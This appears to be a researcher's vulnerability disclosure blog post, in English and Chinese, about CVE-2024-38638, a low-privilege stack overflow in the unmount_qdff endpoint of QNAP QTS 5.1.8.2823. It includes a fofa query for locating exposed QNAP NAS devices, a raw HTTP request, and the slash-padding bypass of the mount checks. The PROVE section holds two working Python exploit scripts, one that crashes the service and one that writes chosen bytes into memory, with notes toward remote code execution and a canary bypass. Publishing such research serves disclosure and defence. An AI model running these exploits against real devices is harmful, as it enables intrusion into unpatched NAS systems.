---
title: 对 QTS 5.1 操作系统的逆向 - MemOverflow & 后续 (CVE-2024-38638)
published: true
---

QTS 是一个 NAS 操作系统，是一个基于 Linux 原始内核二开的系统.  
QTS 5.1.8.2823 远程控制面板存在一处低权限用户的栈溢出，及几处低权限用户的栈地址泄露漏洞，该情况已经汇报给 QNAP 厂商 SRC 并且大范围修复

ID: CVE-2024-38638 (已标记，暂未公开)

这个地方不出意外还有其他利用方式和利用链，如果有想进一步了解该漏洞细节、分析该漏洞的读者朋友请联系笔者交流，关于该栈溢出漏洞的利用方式笔者将会后续在下文 Further Research 栏目更新

fofa语法:  
```fofa
app="QNAP-NAS"
```

本文章参考了 Aliz HammonD's 在今年年初发表的 [QTS 栈溢出漏洞分析报告](https://labs.watchtowr.com/qnap-qts-qnapping-at-the-wheel-cve-2024-27130-and-friends/) 中的部分利用链

The article refers to some of the exploit chains in Aliz HammonD's [QTS StackOverflow vulnerability analysis report](https://labs.watchtowr.com/qnap-qts-qnapping-at-the-wheel-cve-2024-27130-and-friends/) published earlier this year.

![/image/resources/1.png](/image/resources/qts_20.png)

# [](#header-3)A report on the StackOverflow vulnerability of QTS 5.1.8.2823

Vulnerability Product: QTS 5.1.8.2823  
Vulnerability Type: StackOverflow / Further harm  
Vulnerability Authentication Requirement: Low privilege  
Exploitation Method: Remote  

There is a StackOverflow vulnerability in the QTS 5.1.8.2823. When an attacker has a low privilege account of the system, the attacker could upload a qdff and mount it, then call `unmount_qdff` and use some specific methods and parameters to cause a StackOverflow vulnerability

## [](#header-3)Special Thanks:

Special thanks to the TS-212P3 device provided by the NSFOCUS GeWu IoT Security Lab , and the QTS operating system firmware reverse analysis method on the public forum, which enabled me to discover this vulnerability.

![/image/resources/1.png](/image/resources/qts_8.jpg)

## [](#header-3)AUDIT:

To be honest, I don't understand why this vulnerability exists until now. Perhaps it's because previous researchers haven't discovered how it can be exploited (when I was researching this sink, I was also hesitant about whether there was an exact path for malicious payloads to reach the sink)

Let's get start: There are several functions mentioned below. Let me first explain their uses:  
`sub_10B3F8`: The entrance of "unmount_qdff", Here in after referred to as `unmount_qdff`  
`sub_10B350`: Function used to unmount qdff  
`sub_BE8B4`: Used to determine whether qdff is loaded and decide whether to call `sub_10B350`. This is the first function that needs to be bypass  
`Delete_QDFF_Share`: Used to determine whether the qdff unmount is successful and decide whether to call sprintf. This is the second function that needs to be bypass

There is a sprintf was found in the function: `sub_10B350`, and the `sub_10B350` is called by `unmount_qdff`, The `unmount_qdff` retrieves the value of parameter "share" and assigns it to the variable a1 and checks whether qdff has been mounted into the system and unmount the qdff 

Further searching for the string, we can find that the code snippet for `unmount_qdff` is located in "share.cgi" (In fact, share.cgi is a soft link of utilRequest.cgi, and the one that is actually analyzed is utilRequest.cgi)

![/image/resources/1.png](/image/resources/qts_12.png)

A standard POST request that can enter `unmount_qdff` interface is as follows

```http
POST /cgi-bin/filemanager/utilRequest.cgi?func=unmount_qdff&sid={YOUR_SID} HTTP/1.1
Host: 88.88.66.100:5000
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 10

share=asdf
```

In fact, at this point, some readers will wonder whether the StackOverflow of sprintf can be triggered when the value of the share parameter is simply large enough. In fact, this is impossible. After receiving the value of the share parameter, cgi will judge according to the rules. 

Here, at least two conditions must be met to trigger the StackOverflow: 

1. The value in the share parameter must be the real mounted qdff folder. 
2. The value in the share parameter must be constructed in a careful way to be large enough to trigger the StackOverflow.

Fortunately, I found a careful construction method in the following text

![/image/resources/1.png](/image/resources/qts_1.png)

You must mount a qdff folder at first, if the name of mounted qdff folder is "asdf", you can bypass the `sub_BE8B4`(bypass it and step into `sub_10B350`) and `Delete_QDFF_Share`(bypass it and step into `sprintf`) by adding an infinite number of '/' before the "asdf" in parameter "share"(Such as "//////////////////////////////asdf")

In a brief word, if there is a mounted qdff folder named "xxx", you can add any number of '/' in the header of parameter "share" to bypass detection, and the QTS system will mistakenly judge that "//////////////////xxx" is "xxx"

In other words, since the check function only checks whether "asdf\x00" or a string like "////asdf//////" is in the value of the share parameter, it gives us an opportunity to exploit

![/image/resources/1.png](/image/resources/qts_8.png)

Finally execute sprintf and successfully StackOverflow(If you add enough '/', 100000 or 200000, So that it is enough to write the return address of the main running function)

![/image/resources/1.png](/image/resources/qts_2.png)
![/image/resources/1.png](/image/resources/qts_3.png)

Here parameters are formatted into a string by using the sprintf function. We can intuitively observe that the declared stack array v3 only has 2048 bytes, so we only need to input more bytes to cause StackOverflow

![/image/resources/1.png](/image/resources/qts_9.png)


The premise of all the above operations is that the qdff has been mounted, because in `sub_BE8B4` or `Delete_QDFF_Share`, they will always check whether the qdff is mounted. But actually after performing the operation, the mounted files will not actually be deleted after we call `unmount_qdff` in payload(due to the incorrect logical writing of the detection function, they will not be deleted. This will not be repeated here)

![/image/resources/1.png](/image/resources/qts_7.png)
![/image/resources/1.png](/image/resources/qts_10.png)

## [](#header-3)PROVE: 

1. Firstly upload the poc.zip and unzip it(If there is already a mounted qdff, skip this step and modify the value of share)

    (Actually, there is a small episode here. First of all, my machine architecture is aarch64, and the qdff folder cannot be generated. So I asked the customer service and asked for a tested x86_64 architecture machine to generate a complete qdff folder. In short, the qdff folder was successfully generated and obtained.)

    ![/image/resources/1.png](/image/resources/qts_13.jpg)

    [Click Here Download poc.zip](/image/resources/poc.zip)
   
    ![/image/resources/1.png](/image/resources/qts_4.png)

2.  mount the qdff(If there is already a mounted qdff, skip this step and modify the value of share)

    ![/image/resources/1.png](/image/resources/qts_5.png)

3.  Get the known current user sid, run belowing code and input the IP、Port、sid
    (This is a simple version of payload, binary not included)

    ```py
    import requests

    host = input("Please input the IP: ")
    port = input("Please input the Port: ")
    port = port if port != '' else '5000'
    sid = input("Please input the sid: ")

    data = 'share=' + '/' * 120000 + 'asdf'

    res = requests.post(
        url = f"http://{host}:{port}/cgi-bin/filemanager/utilRequest.cgi?func=unmount_qdff&sid={sid}", 
        headers = {
            'Host': f'{host}:{port}',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Content-Length': str(len(data))
        },
        data = data
    )

    print('----------------------------------')
    print(res.text)
    print('----------------------------------')

    if 'Internal Server Error' in res.text: 
        print('Success! ')
    else:
        print('Failed, please check if sid has expired')
    ```

    Exp that writes any bytes from 0x00 to 0x7f to memory

    ```py
    import requests
    from urllib.parse import quote
    import json

    host = '127.0.0.1'
    port = 5000
    sid = ''            #Your sid
    path = '/Multimedia'        #The path you upload qdff foler
    filename = 'Backup 1.qdff'  #The name of the qdff folder you uploaded

    bytes_you_wanna_insert = b'\x01\x02\x03\x04'    #The bytes you wanna write into the memory, here is a example
    backslash_nums = 123000                         #The number of backslash, related to the address you write your bytes, here is a example

    def qts_req(data: str, api: str):
        res = requests.post(
            url = f"http://{host}:{port}/cgi-bin/filemanager/utilRequest.cgi?func={api}&sid={sid}", 
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Content-Length': str(len(data))
            },
            data = data
        )
        return res.text

    def mount(path: str, filename: str, bytes: bytes) -> bool:
        '''
        Mount the foler which name is bytes
        '''
        payload = bytes
        res = qts_req(f'path={quote(path)}&file_name={quote(filename)}&custom_name={quote(payload)}&pwd=', 'mount_qdff')
        try:
            res1 = json.loads(res)
            return res1['status'] == 1
        except:
            return False

    def unmount(bytes: bytes):
        '''
        Unmount the foler which name is bytes
        '''
        payload = bytes
        res = qts_req(f'share={quote(payload)}', 'unmount_qdff')
        try:
            res1 = json.loads(res)
            return res1['status'] == 1
        except:
            return False

    def StackOverflow():
        print(mount(path, filename, bytes_you_wanna_insert))
        unmount(b'/' * backslash_nums + bytes_you_wanna_insert)
        print(unmount(bytes_you_wanna_insert))

    StackOverflow()
    ```

    ![/image/resources/1.png](/image/resources/qts_6.png)
    

## [](#header-3)HARM: 

A low privileged attacker could manipulate the qdff folder name to redirect the current function to the address corresponding to the qdff folder name, Even causing RCE

A simple explanation: if there is a mounted qdff folder which name is "asdf00000000你!", and if the data "你!" being written at the return address of a certain function, then the function will jump to address 0x21a0bde4

```python
#this is just a simple example, not applicable to any chip architecture
'/' * 100000 + "asdf00000000你!"
```

Actually here you can input any characters in the ASCII set to simulate any bytes between [0, 127], so how to simluate the higher bytes? use UTF-8 characters set

I have to say that the design of being able to input characters in the ASCII character set and UTF-8 character set is the most outrageous thing. This design not only completely broadens the byte range required to construct an exploit chain (from the a-z A-Z 0-9 to the current range of almost 0x00 to 0xff), but also makes the StackOverflow vulnerability which basically does not cause any harm very easy to construct an exploit chain

## [](#header-3)Further Research

Unfortunately, more time is needed to bypass these stack protections

![/image/resources/1.png](/image/resources/qts_11.png)

First we must compile the executable file to get the environment variables to run cgi and compile gdbserver. To compile cgi and gdbserver, a compiler(gcc, golang, java) must be installed or cross compile. To install compiler, you must have a ready-made aarch64 architecture compiler or a package manager

Here I choose to install the cross gcc compiler: gcc-aarch64-linux-gnu on Kali-Linux , just run belowing cmd install and compile the C code

```sh
apt install gcc-aarch64-linux-gnu  
#You must compile the GLIBC into the excutable file
aarch64-linux-gnu-gcc 123.c -static
```

Then the code of 123.c is as follows, which is used to save the environment variables obtained by the current cgi to 1.txt

```c
//123.c
//Writen by leeya_bug
#include <stdio.h>
#include <stdlib.h>

int main() {
    FILE *fp;
    FILE *file;
    char path[1035];
    char *filename = "1.txt";
    fp = popen("env", "r");
    if (fp == NULL) {
        perror("popen");
        return EXIT_FAILURE;
    }
    file = fopen(filename, "w");
    if (file == NULL) {
        perror("fopen");
        pclose(fp);
        return EXIT_FAILURE;
    }
    while (fgets(path, sizeof(path) - 1, fp) != NULL) {
        fputs(path, file);
    }
    fclose(file);
    pclose(fp);
    printf("Environment variables have been saved to %s\n", filename);
    return 0;
}
```

After the compilation is complete, transfer it into the QTS operating system of aarch64 architecture, and it is found that it can run successfully

![/image/resources/1.png](/image/resources/qts_14.png)

[Click Here Download env.cgi](/image/resources/env.cgi)  
[Click Here Download gdbserver-8.3.1-aarch64-le](https://github.com/Leeyangee/gdb-static/raw/master/gdbserver-8.3.1-aarch64-le)

After further observation, it was found that only a few parameters were needed to make utilRequest.cgi work properly.

![/image/resources/1.png](/image/resources/qts_15.png)

Here I refer to Aliz HammonD's research report, but found that the exploit chain is no longer available due to the various security measures recently added by the manufacturer

[https://labs.watchtowr.com/qnap-qts-qnapping-at-the-wheel-cve-2024-27130-and-friends/](https://labs.watchtowr.com/qnap-qts-qnapping-at-the-wheel-cve-2024-27130-and-friends/)
[https://www.seebug.org/vuldb/ssvid-99838](https://www.seebug.org/vuldb/ssvid-99838)

1. bypass Canary:

    Here is a __stack_chk_guard and __stack_chk_fail here, how can we bypass it? obviously thats not difficult

    ![/image/resources/1.png](/image/resources/qts_16.png)

    further analysis of this vulnerability will continue to be shared here

## [](#header-3)Info

This vulnerability was submitted for research purposes, So after QTS 5.1.8.2823 fixes the vulnerability and issues a CVE number, I will publicly disclose the details of the vulnerability for research purposes regardless of whether there is a bounty or not

discovered by leeya_bug

-----

于 2024 11 13日更新：某公司疑似在近期的 Pwn2Own 2024 赛事中利用了该漏洞作为 利用链入口，在情况不清楚时将不会放出更多利用链